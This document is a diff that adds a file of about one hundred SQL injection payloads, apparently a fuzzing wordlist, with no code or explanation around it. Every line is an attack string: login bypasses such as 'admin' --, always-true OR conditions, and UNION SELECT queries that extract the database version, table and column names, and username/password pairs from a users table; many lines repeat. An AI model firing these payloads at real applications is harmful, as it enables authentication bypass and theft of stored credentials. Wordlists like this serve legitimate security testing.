@@ -1,0 +1,100 @@
+' OR 1=1 --
+" OR 1=1 --
+') OR '1'='1' --
+' OR 'x'='x
+') OR ('a'='a
+admin' --
+admin' #
+admin'/*
+' OR 1=1#
+' OR '1'='1#
+" OR 1=1#
+1' AND 1=1 --
+1" AND 1=1 --
+' OR '1'='1' --
+' OR 1=1 --
+' OR 'x'='x --
+1' OR '1'='1
+admin'--
+admin'/*
+' or 'a'='a
+UNION SELECT NULL,NULL--
+UNION SELECT 1,2--
+' AND 1=1
+' OR 'a'='a
+' OR '1'='1
+1 AND 1=1
+1' OR 1=1 --
+' UNION SELECT 1,2,3
+' UNION SELECT NULL,NULL
+' UNION SELECT 1,version()--
+UNION SELECT username,password FROM users--
+UNION SELECT table_name,column_name FROM information_schema.columns--
+AND 1=1
+OR 1=1
+' AND 1=0
+"' OR 1=1 --
+' OR 1=1 LIMIT 1 --
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT username, password FROM users--
+' OR '1'='1'
+OR '1'='1'
+' OR ''=''
+' AND ''=''
+SELECT * FROM users WHERE name = 'admin' --
+SELECT * FROM users WHERE name = 'admin' and '1'='1'
+' AND '1'='1
+' OR 1=1 --
+OR 1=1 --
+' OR '1'='1' --
+SELECT * FROM users WHERE name = '' OR '1'='1'
+' AND 1=1
+' AND 1=0 --
+' UNION SELECT 1,database()--
+' UNION SELECT user(),database()--
+' OR 1=1 UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT 1,version()--
+' UNION ALL SELECT user(), database() --
+admin'--
+admin'/*
+UNION SELECT NULL,version()--
+UNION SELECT database(),version()--
+UNION SELECT 1,2,3
+OR 1=1
+' UNION SELECT 1,@@version
+' UNION SELECT username, password FROM users WHERE '1'='1
+admin' OR '1'='1
+' UNION SELECT table_name FROM information_schema.tables--
+SELECT * FROM users WHERE username = 'admin' --
+' OR 1=1--
+' OR 'a'='a--
+SELECT * FROM users WHERE username = 'admin' UNION ALL SELECT NULL,NULL--
+' OR ''=' --
+' OR ''=' --
+1' OR '1'='1'
+admin' UNION SELECT NULL,NULL--
+UNION SELECT NULL,@@version
+UNION SELECT user(),version()
+UNION SELECT NULL,version()
+' OR '1'='1'--
+UNION SELECT username,password FROM users
+' OR '1'='1
+' UNION SELECT 1,2--
+' UNION ALL SELECT 1,database()
+' UNION SELECT database(),table_name FROM information_schema.tables--
+' UNION ALL SELECT NULL,NULL--
+' AND 1=1
+' UNION ALL SELECT user(),database()--
+' UNION SELECT @@version
+' UNION SELECT version()
+' UNION SELECT 1,version()
+admin' OR 'x'='x
+admin' UNION SELECT 1,2,3
+' OR 'x'='x--
+' OR '1'='1' LIMIT 1--
+' UNION SELECT NULL,NULL
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT @@version--
+' UNION SELECT username,password FROM users WHERE 'x'='x
+' UNION ALL SELECT NULL,@@version--
